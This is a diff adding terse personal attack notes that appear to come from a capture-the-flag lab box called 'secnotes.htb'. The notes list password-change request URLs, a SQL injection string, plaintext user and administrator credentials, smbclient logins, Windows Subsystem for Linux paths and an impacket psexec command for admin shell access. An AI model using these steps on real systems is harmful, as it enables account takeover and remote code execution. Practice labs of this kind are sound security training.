@@ -1,0 +1,34 @@
+http://127.0.0.1/change_pass.php?password=password&confirm_password=password&submit=submit
+http://10.129.149.180/change_pass.php?password=password&confirm_password=password&submit=submit
+http://secnotes.htb/change_pass.php?password=password&confirm_password=password&submit=submit
+
+one of these work lol
+
+
+\\secnotes.htb\new-site
+tyler / 92g!mA8BGjOirkL%OG*&
+
+
+
+
+smbclient -L 10.129.149.180 -U "tyler"
+smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.129.149.180/new-site
+
+
+
+' or 1='1
+
+second order sqli
+
+
+
+
+
+
+C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+
+C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs
+
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+
+sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.129.149.180 
